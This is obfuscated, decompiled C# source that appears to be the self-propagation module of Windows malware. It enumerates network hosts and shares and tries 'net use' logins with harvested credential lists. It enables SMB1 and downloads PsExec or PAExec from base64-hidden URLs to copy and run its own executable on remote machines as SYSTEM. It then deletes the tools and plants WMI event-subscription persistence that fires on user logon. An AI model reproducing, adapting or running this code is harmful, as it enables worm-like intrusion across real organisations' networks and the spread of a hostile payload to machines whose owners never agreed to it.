using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LSMgrTguKYchoUzfqQ;

internal class nOjRfvWZfrJ
{
	public class GUXbRXfcWbbTaBiH
	{
		public string mkzCLcGcxUdhJ { get; set; }
	}

	public enum SkdOFcAwPw
	{
		DUvRUXdtRTOzPP = 1,
		KvjuUTDgJWB,
		leNdAOTgsPs,
		CyZimzEVENc,
		PWhfXHkSBXNxO
	}

	public enum XzAYUJrTwnaF
	{
		idNGvvrSSijw,
		WSbRxEsgcwAB,
		PQmWHNBQKyKCwRmPn,
		KhJvxmhPotp
	}

	public enum QVbFihcCjgkNSzh
	{
		PDDFTaHFirEv = 1,
		HWzTcjmfgfKkTm = 2,
		torcBlCCpAZI = 4,
		UcQzanYGvPmQN = 8,
		GPQjwtForgsBVgS = 16,
		oiumoMLCVaMJ = 19
	}

	public enum rzVqZqPyFDTTZ
	{
		lXSAMjxpngp,
		qlWqhDgcIuvhh,
		QEPuWjPvWfM,
		UeOSwrXdWAttZ,
		FeXVXMbRPmgTD,
		RLxZCceJbAteK,
		fhlgUqHKhvTV,
		eydFamORRkBP,
		FcZEuTlTRBwsP,
		TdkihrHbDTKpjXuE,
		EbijZXdcrZ,
		cWKNzHnNPFqn
	}

	public class yIyOGkzBWSuwqTRb : IEnumerable
	{
		private enum pzZdtYRRtTBmw
		{
			GbxuHzBwMVUyrg = 0,
			rEsPPElPPRZaN = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class tIRhcovfgap
		{
			public SkdOFcAwPw HWYCMebbIRotRW;

			public XzAYUJrTwnaF fdBvVEQVldITG;

			public rzVqZqPyFDTTZ QonUdEbovJS;

			public QVbFihcCjgkNSzh sgnMxWMeTNJYvL;

			public string NIvhfwNStVVFvcm;

			public string LndEKCDnIZjFDZW;

			public string AicSeYUXJryLC;

			public string PMwbdGkcGKvD;
		}

		private ArrayList rmrPeuwUVC = new ArrayList();

		public int WfIOzNGlTGiz => rmrPeuwUVC.Count;

		[DllImport("Mpr.dll")]
		private static extern pzZdtYRRtTBmw WNetOpenEnumA(SkdOFcAwPw dwScope, XzAYUJrTwnaF dwType, QVbFihcCjgkNSzh dwUsage, tIRhcovfgap p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern pzZdtYRRtTBmw WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern pzZdtYRRtTBmw WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(tIRhcovfgap pRsrc, SkdOFcAwPw scope, XzAYUJrTwnaF type, QVbFihcCjgkNSzh usage, rzVqZqPyFDTTZ displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == pzZdtYRRtTBmw.GbxuHzBwMVUyrg)
			{
				pzZdtYRRtTBmw pzZdtYRRtTBmw;
				do
				{
					pzZdtYRRtTBmw = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (pzZdtYRRtTBmw)
					{
					case pzZdtYRRtTBmw.rEsPPElPPRZaN:
						continue;
					case pzZdtYRRtTBmw.GbxuHzBwMVUyrg:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.QonUdEbovJS == displayType)
						{
							rmrPeuwUVC.Add(pRsrc.LndEKCDnIZjFDZW);
						}
						if ((pRsrc.sgnMxWMeTNJYvL & QVbFihcCjgkNSzh.HWzTcjmfgfKkTm) == QVbFihcCjgkNSzh.HWzTcjmfgfKkTm)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (pzZdtYRRtTBmw != pzZdtYRRtTBmw.rEsPPElPPRZaN);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public yIyOGkzBWSuwqTRb(SkdOFcAwPw scope, XzAYUJrTwnaF type, QVbFihcCjgkNSzh usage, rzVqZqPyFDTTZ displayType)
		{
			tIRhcovfgap pRsrc = new tIRhcovfgap();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return rmrPeuwUVC.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct mZSxslBpxprz
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string nadfmqVHJc;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string SArtYSORuiSXGu;

		public uint YkeXhnxpyqVO;

		public uint pNqLMOCJDJlNuT;

		public IntPtr wWmXaNuXZOR;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct AaJzuTLzNM
	{
		public int YkeXhnxpyqVO;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string KpXoUdrkFFEw;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string rdCdrvqICCvxHdI;
	}

	public struct jyHMZamndNyfjOu
	{
		public string TCtXGuvtVQQ;

		public string[] QHOAaAzpyUZKUo;

		public jyHMZamndNyfjOu(string Name, string[] Target)
		{
			TCtXGuvtVQQ = Name;
			QHOAaAzpyUZKUo = Target;
		}
	}

	[CompilerGenerated]
	private sealed class zkSNQoUMEJE
	{
		public string imTTsSRseOEYMs;

		public string rKDyxPfGrzsME;

		public void _003CRun_003Eb__1(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !plxWMHzhlTKmphv(ip))
			{
				return;
			}
			try
			{
				if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
				{
					for (int i = 0; i < RVQUKSBUDfG.Count; i++)
					{
						VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use \\\\" + ip + " /USER:" + RVQUKSBUDfG[i] + " " + cEFnXbvKywJd[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use \\\\" + ip);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
			{
				for (int j = 0; j < RVQUKSBUDfG.Count; j++)
				{
					if (VSCOSikLsIYu.PjYPvoKAPPiXO)
					{
						if (File.Exists(imTTsSRseOEYMs))
						{
							VSCOSikLsIYu.lDUkCKSsmpNIssDW(imTTsSRseOEYMs, "\\\\" + ip + " -u \"" + RVQUKSBUDfG[j] + "\" -p \"" + cEFnXbvKywJd[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(rKDyxPfGrzsME))
					{
						VSCOSikLsIYu.lDUkCKSsmpNIssDW(rKDyxPfGrzsME, "\\\\" + ip + " -u \"" + RVQUKSBUDfG[j] + "\" -p \"" + cEFnXbvKywJd[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (VSCOSikLsIYu.PjYPvoKAPPiXO)
			{
				if (File.Exists(imTTsSRseOEYMs))
				{
					VSCOSikLsIYu.lDUkCKSsmpNIssDW(imTTsSRseOEYMs, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(rKDyxPfGrzsME))
			{
				VSCOSikLsIYu.lDUkCKSsmpNIssDW(rKDyxPfGrzsME, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class alrEFEUIyxYTs
	{
		public string enabgPKQCpQBpGmlR;

		public bool _003CGetIPAddresses_003Eb__5(string o)
		{
			return o != enabgPKQCpQBpGmlR;
		}
	}

	private const int IPWPTtufbIDe = 268435455;

	private const int rVCxKQQCizLbY = 0;

	public static List<string> lhwkUsVSRlIUOe = new List<string>();

	public static string iWuwruRsugii = "";

	public static List<string> RVQUKSBUDfG = new List<string>();

	public static List<string> cEFnXbvKywJd = new List<string>();

	public static List<string> IxXmpwitacdTB = new List<string>();

	public static List<GUXbRXfcWbbTaBiH> xoMLOUJaHaoyc()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<GUXbRXfcWbbTaBiH> list = new List<GUXbRXfcWbbTaBiH>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new GUXbRXfcWbbTaBiH
						{
							mkzCLcGcxUdhJ = "\\" + stringBuilder.ToString() + "\\Users"
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string rfYMlHLzrait, int VRKIlXOPuZOw, int aRaTSUPjZBEmD, out IntPtr siwijDPXtUqYX, [MarshalAs(UnmanagedType.I4)] out int GoENRitXtzpbb, [MarshalAs(UnmanagedType.I4)] ref int GZIYJqBBxbC);

	public static List<jyHMZamndNyfjOu> QQElYYAaOi(string tcdeMOtSufxGW)
	{
		try
		{
			List<jyHMZamndNyfjOu> list = new List<jyHMZamndNyfjOu>();
			IntPtr siwijDPXtUqYX = default(IntPtr);
			int GoENRitXtzpbb = 0;
			int GZIYJqBBxbC = 0;
			if (NetDfsEnum(tcdeMOtSufxGW, 3, 268435455, out siwijDPXtUqYX, out GoENRitXtzpbb, ref GZIYJqBBxbC) == 0)
			{
				for (int i = 0; i < GoENRitXtzpbb; i++)
				{
					mZSxslBpxprz mZSxslBpxprz = (mZSxslBpxprz)Marshal.PtrToStructure(siwijDPXtUqYX + i * Marshal.SizeOf(typeof(mZSxslBpxprz)), typeof(mZSxslBpxprz));
					if (mZSxslBpxprz.nadfmqVHJc == tcdeMOtSufxGW)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < mZSxslBpxprz.pNqLMOCJDJlNuT; j++)
					{
						IntPtr ptr = new IntPtr(mZSxslBpxprz.wWmXaNuXZOR.ToInt64() + j * Marshal.SizeOf(typeof(AaJzuTLzNM)));
						AaJzuTLzNM aaJzuTLzNM = (AaJzuTLzNM)Marshal.PtrToStructure(ptr, typeof(AaJzuTLzNM));
						if (aaJzuTLzNM.YkeXhnxpyqVO == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", aaJzuTLzNM.KpXoUdrkFFEw, aaJzuTLzNM.rdCdrvqICCvxHdI }));
						}
					}
					string text = mZSxslBpxprz.nadfmqVHJc.Replace(tcdeMOtSufxGW, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new jyHMZamndNyfjOu(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void pHGASfGgKQhlcU()
	{
		VSCOSikLsIYu.MWUCLrCldjxwcGK("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<GUXbRXfcWbbTaBiH> list = xoMLOUJaHaoyc();
		List<jyHMZamndNyfjOu> list2 = QQElYYAaOi(Environment.MachineName);
		if (list2 != null)
		{
			foreach (jyHMZamndNyfjOu item in list2)
			{
				string[] qHOAaAzpyUZKUo = item.QHOAaAzpyUZKUo;
				foreach (string text in qHOAaAzpyUZKUo)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
						{
							for (int j = 0; j < RVQUKSBUDfG.Count; j++)
							{
								VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use " + text + " /USER:" + RVQUKSBUDfG[j] + " " + cEFnXbvKywJd[j]);
							}
						}
						else
						{
							VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use " + text);
						}
						VSCOSikLsIYu.VixAiWNPKoHGQJKOH.Add(text.Replace("IPC$", ""));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (GUXbRXfcWbbTaBiH item2 in list)
		{
			if (item2.mkzCLcGcxUdhJ.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
				{
					for (int k = 0; k < RVQUKSBUDfG.Count; k++)
					{
						VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use " + item2.mkzCLcGcxUdhJ + " /USER:" + RVQUKSBUDfG[k] + " " + cEFnXbvKywJd[k]);
					}
				}
				else
				{
					VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use " + item2.mkzCLcGcxUdhJ);
				}
				VSCOSikLsIYu.VixAiWNPKoHGQJKOH.Add(item2.mkzCLcGcxUdhJ.Replace("IPC$", ""));
			}
			catch
			{
			}
		}
	}

	public static void iePeWOBwDiHc(string krIxFejvcedQOx, string ZIxpVMivOzLIo, string pYmZzpGgvRi)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + krIxFejvcedQOx + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(ZIxpVMivOzLIo);
			val2.get_Options().set_Password(pYmZzpGgvRi);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + krIxFejvcedQOx + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void MwmELksCzj()
	{
		List<zAxhfMsesbCV> list = zAxhfMsesbCV.asACmQLNekpBU();
		foreach (zAxhfMsesbCV item in list)
		{
			lhwkUsVSRlIUOe.Add(item.obnMrAKZfbfgFrxN);
		}
		string imTTsSRseOEYMs = "";
		string rKDyxPfGrzsME = "";
		try
		{
			imTTsSRseOEYMs = QpKDFhRNDXDw();
		}
		catch
		{
		}
		try
		{
			rKDyxPfGrzsME = CnTsGFvttwmQ();
		}
		catch
		{
		}
		foreach (zAxhfMsesbCV item2 in list)
		{
			try
			{
				if (item2.obnMrAKZfbfgFrxN.StartsWith("10.") || item2.obnMrAKZfbfgFrxN.StartsWith("172.") || item2.obnMrAKZfbfgFrxN.StartsWith("192.168.") || item2.obnMrAKZfbfgFrxN.Contains(""))
				{
					GpDBcWTrqaBjnPZ.UmrhBfydMCgSZaZ(item2.ChOmpmfCmmQybg, item2.obnMrAKZfbfgFrxN, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lhwkUsVSRlIUOe, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && plxWMHzhlTKmphv(ip))
				{
					try
					{
						if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
						{
							for (int i = 0; i < RVQUKSBUDfG.Count; i++)
							{
								VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use \\\\" + ip + " /USER:" + RVQUKSBUDfG[i] + " " + cEFnXbvKywJd[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							VSCOSikLsIYu.lDUkCKSsmpNIssDW("net.exe", "use \\\\" + ip);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (VSCOSikLsIYu.fmXCIzNAHwKf == "YES")
					{
						for (int j = 0; j < RVQUKSBUDfG.Count; j++)
						{
							if (VSCOSikLsIYu.PjYPvoKAPPiXO)
							{
								if (File.Exists(imTTsSRseOEYMs))
								{
									VSCOSikLsIYu.lDUkCKSsmpNIssDW(imTTsSRseOEYMs, "\\\\" + ip + " -u \"" + RVQUKSBUDfG[j] + "\" -p \"" + cEFnXbvKywJd[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(rKDyxPfGrzsME))
							{
								VSCOSikLsIYu.lDUkCKSsmpNIssDW(rKDyxPfGrzsME, "\\\\" + ip + " -u \"" + RVQUKSBUDfG[j] + "\" -p \"" + cEFnXbvKywJd[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (VSCOSikLsIYu.PjYPvoKAPPiXO)
					{
						if (File.Exists(imTTsSRseOEYMs))
						{
							VSCOSikLsIYu.lDUkCKSsmpNIssDW(imTTsSRseOEYMs, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(rKDyxPfGrzsME))
					{
						VSCOSikLsIYu.lDUkCKSsmpNIssDW(rKDyxPfGrzsME, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(imTTsSRseOEYMs))
			{
				File.Delete(imTTsSRseOEYMs);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(rKDyxPfGrzsME))
			{
				File.Delete(rKDyxPfGrzsME);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> nTTsYKxAucuCd()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string QpKDFhRNDXDw()
	{
		if (IntPtr.Size == 8)
		{
			return beMQZBFpcMLmBff(new Uri(VSCOSikLsIYu.AKDOdYwKlSeS("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return beMQZBFpcMLmBff(new Uri(VSCOSikLsIYu.AKDOdYwKlSeS("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string CnTsGFvttwmQ()
	{
		if (IntPtr.Size == 8)
		{
			return beMQZBFpcMLmBff(new Uri(VSCOSikLsIYu.AKDOdYwKlSeS("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return beMQZBFpcMLmBff(new Uri(VSCOSikLsIYu.AKDOdYwKlSeS("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool plxWMHzhlTKmphv(string AeajbnrxFDeV)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(AeajbnrxFDeV);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string beMQZBFpcMLmBff(Uri zEkUPKszIrGZ)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(zEkUPKszIrGZ, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> eHglhQkGPc()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string enabgPKQCpQBpGmlR in array4)
			{
				if (enabgPKQCpQBpGmlR.Contains(":"))
				{
					array = array.Where((string o) => o != enabgPKQCpQBpGmlR).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
